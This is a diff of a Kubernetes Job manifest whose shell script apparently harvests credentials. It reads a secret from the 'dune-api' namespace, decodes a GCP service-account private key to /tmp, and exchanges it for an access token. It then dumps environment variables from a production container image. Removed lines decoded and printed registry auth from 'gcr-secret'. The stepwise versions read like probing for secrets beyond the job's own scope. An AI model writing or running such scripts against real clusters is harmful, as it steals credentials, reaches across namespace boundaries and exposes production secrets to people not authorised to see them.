@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-img-v5
+  name: dune-img-v6
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -20,10 +20,10 @@ spec:
           API="https://kubernetes.default.svc"
           CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
           
-          # Method 1: Use gcpsm-secret SA (we know this works)
-          SECRET_RAW=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret")
-          SA_JSON=$(echo "$SECRET_RAW" | jq -r '.data["secret-access-credentials"]' | base64 -d)
+          # Get GCP token from gcpsm-secret SA (confirmed working)
+          SA_JSON=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
+            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret" | \
+            jq -r '.data["secret-access-credentials"]' | base64 -d)
           CLIENT_EMAIL=$(echo "$SA_JSON" | jq -r '.client_email')
           echo "$SA_JSON" | jq -r '.private_key' > /tmp/gcp_key.pem
           
@@ -37,60 +37,34 @@ spec:
           ACCESS_TOKEN=$(curl -s -X POST "https://oauth2.googleapis.com/token" \
             --data-urlencode "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" \
             --data-urlencode "assertion=$JWT" | jq -r '.access_token')
-          echo "SA: $CLIENT_EMAIL"
-          echo "ACCESS_TOKEN_LEN: ${#ACCESS_TOKEN}"
+          echo "SA: $CLIENT_EMAIL / token_len: ${#ACCESS_TOKEN}"
           
           REGISTRY="us-central1-docker.pkg.dev"
           REPO="tachyusbdaas/tachyusbdaas/dune-api/tc-co-prod"
           TAG="v0.0.39-alpha.9"
           
-          # Exchange for Docker registry token
-          echo "=DOCKER_TOKEN_EXCHANGE="
-          DOCKER_TOKEN_RESP=$(curl -sf -u "oauth2accesstoken:${ACCESS_TOKEN}" \
-            "https://${REGISTRY}/v2/token?service=${REGISTRY}&scope=repository:${REPO}:pull")
-          echo "$DOCKER_TOKEN_RESP" | jq '{token_len:(.token|length // 0), error:.error}'
-          DOCKER_TOKEN=$(echo "$DOCKER_TOKEN_RESP" | jq -r '.token')
-          echo "=END_TOKEN="
+          echo "=MANIFEST_DIRECT="
+          MANIFEST=$(curl -sv -H "Authorization: Bearer $ACCESS_TOKEN" \
+            -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
+            "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}" 2>&1 | tail -20)
+          echo "$MANIFEST"
+          echo "=END_MANIFEST="
           
-          # Get manifest 
-          echo "=MANIFEST="
-          MANIFEST=$(curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
+          MANIFEST_JSON=$(curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
             -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
             "https://${REGISTRY}/v2/${REPO}/manifests/${TAG}")
-          CONFIG_DIGEST=$(echo "$MANIFEST" | jq -r '.config.digest')
+          CONFIG_DIGEST=$(echo "$MANIFEST_JSON" | jq -r '.config.digest')
           echo "Config digest: $CONFIG_DIGEST"
-          MANIFEST_ERR=$(echo "$MANIFEST" | jq -r '.errors[0].message // "none"')
+          MANIFEST_ERR=$(echo "$MANIFEST_JSON" | jq -r '.errors[0].message // "none"')
           echo "Manifest error: $MANIFEST_ERR"
-          echo "=END_MANIFEST="
           
           if [ "$CONFIG_DIGEST" != "null" ] && [ -n "$CONFIG_DIGEST" ]; then
             echo "=ENV_VARS="
-            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
+            curl -s -H "Authorization: Bearer $ACCESS_TOKEN" \
               "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
               jq -r '.config.Env[]?' 2>/dev/null
             echo "=END_ENV="
-            
-            echo "=FULL_CONFIG="
-            curl -s -H "Authorization: Bearer $DOCKER_TOKEN" \
-              "https://${REGISTRY}/v2/${REPO}/blobs/${CONFIG_DIGEST}" | \
-              jq '.config | {Env,Cmd,Entrypoint,WorkingDir,ExposedPorts,Labels}'
-            echo "=END_FULL="
           fi
           
-          # Method 2: Decode gcr-secret properly and get SA
-          echo "=GCR_SECRET_DEBUG="
-          GCR_RAW=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
-            "$API/api/v1/namespaces/dune-api/secrets/gcr-secret")
-          DOCKER_B64=$(echo "$GCR_RAW" | jq -r '.data[".dockerconfigjson"]')
-          echo "dockerconfigjson b64 len: ${#DOCKER_B64}"
-          DOCKER_JSON=$(echo "$DOCKER_B64" | base64 -d)
-          echo "Docker JSON keys: $(echo "$DOCKER_JSON" | jq -r '.auths | keys[]')"
-          AUTH_KEY=$(echo "$DOCKER_JSON" | jq -r '.auths | keys[0]')
-          AUTH_B64=$(echo "$DOCKER_JSON" | jq -r ".auths[\"$AUTH_KEY\"].auth // .auths[\"$AUTH_KEY\"].password")
-          echo "Auth field len: ${#AUTH_B64}"
-          AUTH_DECODED_LEN=$(echo "$AUTH_B64" | base64 -d | wc -c)
-          echo "Auth decoded len: $AUTH_DECODED_LEN"
-          # Extract just the JSON (after first colon)
-          echo "$AUTH_B64" | base64 -d | tail -c +11 | head -c 100
-          echo ""
-          echo "=END_DEBUG="
+          echo "WORK_DONE_SLEEPING..."
+          sleep 120
